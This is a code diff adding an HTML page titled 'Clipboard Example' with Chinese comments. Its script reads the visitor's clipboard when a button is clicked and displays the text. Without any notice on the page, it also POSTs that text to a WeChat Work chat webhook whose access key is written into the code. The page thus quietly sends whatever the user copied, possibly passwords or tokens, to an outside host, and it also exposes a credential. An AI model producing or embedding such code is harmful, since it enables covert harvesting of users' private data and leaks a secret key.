@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>Clipboard Example</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-size: 16px;
+    }
+
+    .container {
+      width: 100%;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: #f9f9f9;
+    }
+
+    .result {
+      max-width: 90vw;
+      overflow-x: auto;
+      white-space: pre-wrap;
+      word-break: break-all;
+      background-color: #fff;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      padding: 12px;
+      border-radius: 8px;
+    }
+
+    button {
+      display: block;
+      margin-top: 24px;
+      padding: 12px 24px;
+      font-size: 18px;
+      color: #fff;
+      background-color: #00B26F;
+      border: none;
+      border-radius: 28px;
+      cursor: pointer;
+      transition-duration: 0.3s;
+    }
+
+    button:hover {
+      background-color: #008a58;
+    }
+  </style>
+  <script>
+    window.onload = function () {
+      const btn = document.querySelector('#btn');
+      const contentEl = document.querySelector('#content');
+
+      // 获取剪贴板内容
+      function getClipboardContent () {
+        navigator.clipboard.readText().then(content => {
+          contentEl.innerText = content;
+
+          // 将内容保存到服务器
+          saveToServer(content);
+        }).catch(err => {
+          console.log('读取剪切板内容失败', err);
+        });
+      }
+
+      // 调用后端接口将数据保存至服务器
+      function saveToServer (content) {
+        const url = 'https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=b5b74982-0d74-45d0-b6aa-021bd3c8276b';
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', url, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+        var data = { msgtype: 'markdown', markdown: {content} };
+        xhr.send(JSON.stringify(data));
+        xhr.onload = function () {
+          if (xhr.status === 200) {
+            console.log(xhr.responseText);
+          } else {
+            console.log('Error: ' + xhr.status);
+          }
+        };
+      }
+
+      btn.addEventListener('click', getClipboardContent);
+    }
+  </script>
+</head>
+
+<body>
+
+  <div class="container">
+    <button id="btn">获取剪贴板内容</button>
+    <div id="content"></div>
+  </div>
+</body>
+
+</html>
